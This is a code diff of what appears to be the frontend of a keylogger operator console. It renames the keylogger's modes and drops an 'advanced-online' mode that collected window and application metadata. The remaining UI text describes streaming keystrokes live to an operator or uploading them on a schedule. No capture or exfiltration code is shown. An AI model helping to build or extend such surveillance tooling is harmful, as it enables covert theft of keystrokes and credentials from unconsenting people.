@@ -16,19 +16,18 @@
 	import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
 	import type { WorkspaceLogEntry } from '$lib/workspace/types';
 
-	type KeyloggerMode = 'online' | 'offline' | 'advanced-online';
+	type KeyloggerMode = 'standard' | 'offline';
 
 	const toolMap = {
-		online: 'keylogger-online',
+		standard: 'keylogger-standard',
 		offline: 'keylogger-offline',
-		'advanced-online': 'keylogger-advanced-online'
 	} as const;
 
 	const modeCopy: Record<
 		KeyloggerMode,
 		{ subtitle: string; cadenceLabel: string; bufferLabel: string }
 	> = {
-		online: {
+		standard: {
 			subtitle: 'Stream keystrokes live into the operator console.',
 			cadenceLabel: 'Stream cadence (ms)',
 			bufferLabel: 'In-memory buffer (events)'
@@ -37,11 +36,6 @@
 			subtitle: 'Persist keystrokes locally and upload on a schedule.',
 			cadenceLabel: 'Batch interval (minutes)',
 			bufferLabel: 'Disk retention limit (events)'
-		},
-		'advanced-online': {
-			subtitle: 'Capture keystrokes with active window and application metadata.',
-			cadenceLabel: 'Stream cadence (ms)',
-			bufferLabel: 'Context window (events)'
 		}
 	};
 
